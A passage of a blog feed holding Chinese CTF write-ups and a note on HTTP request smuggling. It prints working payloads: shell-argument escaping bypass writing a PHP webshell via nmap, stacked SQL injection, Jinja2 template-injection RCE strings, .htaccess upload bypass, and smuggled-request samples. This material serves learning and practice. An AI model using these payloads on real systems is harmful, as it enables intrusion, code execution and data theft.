href="https://www.cnblogs.com/karsa/p/13130130.html">转自</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题029</title>
    <link href="/2021/02/12/BUU029/"/>
    <url>/2021/02/12/BUU029/</url>
    
    <content type="html"><![CDATA[<h2 id="二十九、"><a href="#二十九、" class="headerlink" title="二十九、"></a>二十九、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[BUUCTF 2018]Online Tool<br>PHP代码审计      </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment">//获取IP地址</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，在一些字符前加上斜杠\</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//新建一个以$sandbox命名的目录，@是压制错误提示的意思</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//将PHP当前目录改为$sandbox</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        </span></code></pre></code></pre><p>大致思路就是构造payload，绕过<code>escapeshellarg</code>和<code>escapeshellcmd</code>，执行命令<br>这两个函数一起使用的漏洞：<br>抄一下大佬的笔记：<br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题 </a>     </p><blockquote><p>传入的参数是:<code>127.0.0.1&#39; -v -d a=1</code><br>由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果:<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code><br>经过escapeshellcmd针对第二步处理之后的参数中的\以及a=1’中的单引号进行处理转义之后的效果:<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>         </p></blockquote><p>但我自己试的话弄不出来大佬的结果，出来的有<code>^</code>没有<code>\</code>?????<br>构造payload<br>利用nmap的一个参数<code>-oG</code>—–可以实现将命令和结果写入文件<br>所以，就可以利用该参数写入一句话木马    </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/6c39ee2077cc0e8f.png"><br>访问该文件即可<code>/30a6175a3ca36e9980135ca86411d9ff/test.php</code><img src="https://ftp.bmp.ovh/imgs/2021/03/03dc8d99a324aafd.png">      </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>几个函数       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/61248aaf11e6755b.png">    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/c9b7073500bc6c82.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题028</title>
    <link href="/2021/02/11/BUU028/"/>
    <url>/2021/02/11/BUU028/</url>
    
    <content type="html"><![CDATA[<h2 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]高明的黑客<br><img src="https://ae04.alicdn.com/kf/H0c5d474d5be84e36bf49ea28ff95588fv.jpg" alt="02.png">      </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<code>www.tar.gz</code>得到一个压缩包，里面有3002个PHP文件，<img src="https://ae04.alicdn.com/kf/Hf19fd81889a14126917af7acb6db6830p.jpg" alt="03.png"><br>有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><a href="https://blog.csdn.net/a3320315/article/details/102945940">大佬</a>的脚本      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php">import osimport requestsimport reimport threadingimport time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'开始时间：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span> time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>threading<span class="token punctuation">.</span><span class="token function">Semaphore</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#这儿设置最大的线程数</span>filePath <span class="token operator">=</span> r<span class="token double-quoted-string string">"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span>os<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token shell-comment comment">#改变当前的路径</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span><span class="token constant">DEFAULT_RETRIES</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token shell-comment comment">#设置重连次数，防止线程数过高，断开连接</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">listdir</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean constant">False</span> <span class="token shell-comment comment"># 设置连接活跃状态为False</span>def <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token single-quoted-string string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span> time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    with <span class="token function">open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token shell-comment comment">#打开php文件，提取所有的$_GET和$_POST的参数</span>            gets <span class="token operator">=</span> <span class="token keyword">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token function">findall</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> <span class="token keyword">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token function">findall</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token shell-comment comment">#所有的$_POST</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token shell-comment comment">#所有的$_GET</span>    <span class="token keyword">for</span> m in gets<span class="token punctuation">:</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"echo 'xxxxxx';"</span>    <span class="token keyword">for</span> n in posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"echo 'xxxxxx';"</span>    url <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/src/'</span><span class="token operator">+</span>file    req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token shell-comment comment">#一次性请求所有的GET和POST</span>    req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment"># 关闭请求  释放内存</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token single-quoted-string string">'utf-8'</span>    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text    <span class="token shell-comment comment">#print(content)</span>    <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span><span class="token shell-comment comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a in gets<span class="token punctuation">:</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token single-quoted-string string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token double-quoted-string string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment"># 关闭请求  释放内存</span>            <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b in posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token double-quoted-string string">"echo 'xxxxxx';"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment"># 关闭请求  释放内存</span>                <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token shell-comment comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>            param <span class="token operator">=</span> a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> b        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'找到了利用文件： '</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token double-quoted-string string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s1<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in files<span class="token punctuation">:</span><span class="token shell-comment comment">#加入多线程</span>   t <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          </code></pre></code></pre><p>运行<br><img src="https://sc03.alicdn.com/kf/Hdef4496632754ec3885fb3bc8cfd8668W.jpg" alt="04.png"><br>payload：<code>/xk0SzyKwfzw.php?Efa5BVG=cat /flag</code>得到flag<img src="https://ae02.alicdn.com/kf/H85c10a4376734c50af5ce78f50a844700.jpg" alt="01.png"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题027</title>
    <link href="/2021/02/10/BUU027/"/>
    <url>/2021/02/10/BUU027/</url>
    
    <content type="html"><![CDATA[<h2 id="二十七、"><a href="#二十七、" class="headerlink" title="二十七、"></a>二十七、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GYCTF2020]Blacklist<br><img src="https://ftp.bmp.ovh/imgs/2021/02/047fc4c497b8d336.png">       </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>和之前做过的差不多，相当于升级版，也可以用堆叠注入，但这次加了一些过滤，改名字的操作不行了<img src="https://ftp.bmp.ovh/imgs/2021/02/703e343d31dac4f9.png"><br><code>1&#39;;show databases;</code>得到库名<img src="https://ftp.bmp.ovh/imgs/2021/02/c38457bb4192a2f2.png"><br><code>1&#39;;show tables;</code>得到表名<img src="https://ftp.bmp.ovh/imgs/2021/02/9a69363862a7a5ea.png"><br><code>1&#39;;show columns from `FlagHere`; </code>得到列名<br><img src="https://ftp.bmp.ovh/imgs/2021/02/863a0a03562ca06c.png"><br>select被禁了，看wp说用<code>handler</code>      </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code><img src="https://ftp.bmp.ovh/imgs/2021/02/7070e0cd90aa2c19.png">     </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><code>handler</code>     <blockquote><p>handler语句可以使我们能够一行一行的浏览一个表的数据，它是MySQL的专用语句，并没有包含到SQL标准中<br><code>handler tbl_name open</code>打开一张表，无返回结果，实际上是声明了一个名为<code>tbl_name</code>的句柄<br><code>handler tbl_name read first</code>获取第一行，<code>read next</code>下一行；最后一行执行后再执行next会返回一个空结果<br><code>handler tbl_name close</code>关闭打开的句柄<br><a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">MORE</a></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Httpsmuggling</title>
    <link href="/2021/02/09/httpsmuggling/"/>
    <url>/2021/02/09/httpsmuggling/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPsmuggling"><a href="#HTTPsmuggling" class="headerlink" title="HTTPsmuggling"></a>HTTPsmuggling</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/b8e5ad2eec4243f0.png"><br><a href="https://paper.seebug.org/1048/#31-cl0get">图片转自</a><br>反向代理服务器与后端服务器之间会重用TCP连接<br>当我们向代理服务器发送请求时，如果两个服务器的实现方式不同，两者对我们发送的请求识别不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求。      </p><h3 id="利用判断"><a href="#利用判断" class="headerlink" title="利用判断"></a>利用判断</h3><p>Apache ATS 6.0.0<del>6.2.2版本<br>和<br>Apache ATS 7.0.0</del>7.1.3版本     </p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>前端代理服务器允许GET请求携带请求体，而后端不允许，会直接忽略<code>Content-Length</code>，不进行处理。</p><pre><code>GET / HTTP/1.1Host: example.comContent-Length: 44GET / secret HTTP/1.1Host: example.com\r\n   </code></pre><p>这样的，到了后端就会认为是两个请求        </p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p>两个<code>Content-Length</code>       </p><pre><code>POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 8\r\nContent-Length: 7\r\n12345\r\na       </code></pre><p>前端代理服务器按第一个处理，后端按第二个处理，最后会剩下一个<code>a</code>，下一次请求时，<code>a</code>便会拼接到下一请求的开头      </p><pre><code>aGET /index.html HTTP/1.1\r\nHost: example.com\r\n       </code></pre><p>栗子：<br>题目：[RoarCTF 2019]Easy Calc<br>源码中发现<code>calc.php</code>,是一段PHP代码<br>而且本题加了WAF，除了数字和一些运算符号都不能正常输出，抓包后，<br><img src="https://ftp.bmp.ovh/imgs/2021/02/b57fd5c9f6a6fba5.png"><br>可以看到，虽然报错了，但是<code>phpinfo()</code>是正常执行了的，接下来就可以输入一些函数读取flag了<br>payload：<code>num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>        </p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>前端服务器只处理<code>Content-Length</code>,而后端服务器遵循<a href="https://www.cnblogs.com/k1988/archive/2010/01/12/2165683.html">RFC2616</a>的规定，忽略掉<code>Content-Length</code>而处理<code>Transfer-Encoding</code>      </p><pre><code>POST / HTTP/1.1\r\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG     </code></pre><p>前端服务器处理<code>Content-Length</code>认为这是一个完整的请求，发送给后端，后端服务器处理<code>Transfer-Encoding</code>,当读到<code>0\r\n</code>时结尾，此时会留下一个<code>G</code>在缓冲区中 。               </p><p>栗子：<br>题目：HGAME week1 走私者的愤怒<br>CL-TE<br><img src="https://ftp.bmp.ovh/imgs/2021/02/41a76ce1c99f06c3.png"><br><code>Apache Traffic Server 7.1.2 </code>所以可能存在走私<br><img src="https://ftp.bmp.ovh/imgs/2021/02/896cf2274b6ca481.png"><br>所以在走私的请求中加入<code>Client-IP:localhost</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/32f96b824c275b5e.png"><br>官方WP中说这道题中间还加了个<code>nginx</code>    </p><pre><code>                        +---[8080]---+                        | 9012-&gt;8080 |                        | ATS7       |                        |            |                        +-------+----+                               |                               |                        +------------+                        |            |                        | nginx      |                        |            |                        +-------+----+                              |                              |                        +---[80]+----+                        |            |                        | LNMP       |                        |            |                        +------------+        </code></pre><p>那个下面的<code>Content-Length</code>应该就是通过ngix的处理的吧          </p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头 </p><pre><code>POST / HTTP/1.1\r\nHost: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n           </code></pre><hr><h4 id="几个问题"><a href="#几个问题" class="headerlink" title="几个问题"></a>几个问题</h4><ul><li>如何判断一道题是考的请求走私？<br>如果能知道服务器Apache版本号，怀疑—–&gt;<code>测试</code>     </li><li>如何判断是哪一类？<br><code>测试！</code></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题026</title>
    <link href="/2021/02/09/BUU026/"/>
    <url>/2021/02/09/BUU026/</url>
    
    <content type="html"><![CDATA[<h2 id="二十六、"><a href="#二十六、" class="headerlink" title="二十六、"></a>二十六、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[BJDCTF 2nd]fake google<br><img src="https://ftp.bmp.ovh/imgs/2021/02/699942b36831db1a.png"> </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码中没发现什么<br>随便输个看看<img src="https://ftp.bmp.ovh/imgs/2021/02/1e1ee07b33ec1f28.png"><br>不知道提示的什么意思，看了wp知道是ssti模板注入<br>按下图判断模板引擎<img src="https://ftp.bmp.ovh/imgs/2021/02/cd1b1a2982003c38.png"><br>输入：<code>&#123;&#123;7*7&#125;&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/02/ec6e2a009fa2999d.png">所以应该是jinja2；如果用tplmap的话可以直接得到是jinja2         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p><p>一位大佬的jinja2模板引擎通用的RCE payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br><command>是要执行的命令       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>payload相关函数      </p><blockquote><p><code>__class__</code> 返回类型所属的对象<br><code>__subclasses__ </code>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__init__ </code>类的初始化方法<br><code>__globals__</code> 对包含函数全局变量的字典的引用<br><code>__mro__</code>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析<br><code>__bases__ </code>返回该对象所继承的基类<br><code> __builtins__</code>是做为默认初始模块        </p></blockquote><p>jinja2语法       </p><blockquote><p>控制结构<code>&#123;% %&#125;</code><br>变量取值<code>&#123;&#123; &#125;&#125;</code><br>jinja2模板中使用 <code>&#123;&#123; &#125;&#125;</code> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等<br>注释<code>&#123;# #&#125;</code><br><a href="https://www.jianshu.com/p/f04dae701361">MORE</a>      </p></blockquote><p>抄一下大佬收集的payload        </p><blockquote><ol><li><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code>         </li><li><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )&#125;&#125;</code>                </li><li><code>&#123;&#123;object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')&#125;&#125;</code>     </li><li><code>&#123;&#123;request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')&#125;&#125;</code>    <a href="https://www.jianshu.com/p/e341b7b7d4f3">转</a>       </li></ol></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题025</title>
    <link href="/2021/02/08/BUU025/"/>
    <url>/2021/02/08/BUU025/</url>
    
    <content type="html"><![CDATA[<h2 id="二十五、"><a href="#二十五、" class="headerlink" title="二十五、"></a>二十五、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[MRCTF2020]你传你ma呢<br><img src="https://ftp.bmp.ovh/imgs/2021/02/c1862f50b71396ed.png">  </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一道上传题<br>php、phtml都不能传，只能是jpg或者png<br>看wp说是要用到<code>.htaccess</code><br>里面写上</p><pre><code>SetHandler application/x-httpd-php//这语句的作用是让Apache将其他类型文件均以php格式解析     </code></pre><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>先上传<code>.htaccess</code><br>抓包改一下<code>Content-Type</code><br>在上传马，后缀改为<code>.jpg</code><br>蚁剑连接<br>根目录下得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/8fe79ecab142d608.png">  </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>.htaccess</code>文件     </p><blockquote><p><code>.htaccess</code>文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。    </p><p><code>SetHandler application/x-httpd-php .jpg</code><br>//将jpg以php解析 </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题024</title>
    <link href="/2021/02/07/BUU024/"/>
    <url>/2021/02/07/BUU024/</url>
    
